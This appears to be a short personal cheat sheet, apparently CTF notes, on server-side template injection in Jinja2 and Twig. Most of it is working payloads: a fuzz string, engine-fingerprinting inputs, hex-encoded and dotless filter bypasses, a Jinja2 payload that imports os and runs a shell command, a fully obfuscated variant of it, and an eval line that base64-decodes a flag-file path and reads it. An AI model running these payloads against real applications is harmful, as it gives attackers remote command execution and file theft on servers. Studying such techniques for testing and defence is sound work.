# Injection (SSTI)

- Fuzz with `${{<%[%'"}}%\\` to find errors.

| **Input** | **Result if Jinja2 (Python)** | **Result if Twig (PHP)** |
| --- | --- | --- |
| `{{7*'7'}}` | `7777777` | `49` |
| `{{config}}` | Prints a config object | Error/Nothing |
| `{{_self}}` | Error | Prints an object |

![Screenshot 2026-02-28 at 2.15.31 PM.png](Injection%20(SSTI)/Screenshot_2026-02-28_at_2.15.31_PM.png)

[https://github.com/Jieyab89/Jinja2-python-or-flask-SSTI-vulnerability-payload-](https://github.com/Jieyab89/Jinja2-python-or-flask-SSTI-vulnerability-payload-)

### **SSTI Filter Bypass (Hex Encoding)**

`{{self|attr("\x5f\x5finit\x5f\x5f")}}`**[+] Desc:** Used to bypass blacklists that block underscores (`_`). `\x5f` is the hex code for an underscore. Double up (`\x5f\x5f`) for dunder methods like `__init__`.

### **SSTI Filter Bypass (No Dots)**

`{{request|attr("application")}}`**[+] Desc:** If the period character (`.`) is filtered, use the `|attr()` filter in Jinja2 to access object properties and "walk" the global namespace.

Check out regex 101 to check what is blocked: [https://regex101.com/](https://regex101.com/)

### **SSTI Remote Command Execution (RCE)**

`{{self.__init__.__globals__['__builtins__']['__import__']('os').popen('ls').read()}}`**[+] Desc:** The "Golden Payload" for Jinja2. It climbs from the local `self` object into the Python built-ins to import the `os` module and execute system commands.

`{{ self|attr("\x5f\x5finit\x5f\x5f")|attr("\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f")|attr("get")("\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f")|attr("get")("\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f")("os")|attr("popen")("ls")|attr("read")() }}`

## Eval

`open(__import__('base64').b64decode('L2ZsYWcudHh0').decode()).read()`